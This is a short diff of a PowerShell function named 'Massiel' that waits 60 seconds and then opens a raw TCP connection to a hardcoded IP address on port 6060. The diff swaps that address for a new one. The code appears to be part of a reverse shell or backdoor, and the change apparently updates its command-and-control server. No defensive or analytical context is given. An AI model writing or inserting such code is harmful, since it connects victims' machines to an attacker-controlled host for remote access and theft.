@@ -4,7 +4,7 @@ Function Massiel {
 
             Start-Sleep -Seconds 60
 
-            $Hosts = '104.168.62.5'
+            $Hosts = '152.0.11.57'
             $Port = 6060
 
             $Clients = New-Object System.Net.Sockets.TcpClient($Hosts, $Port)
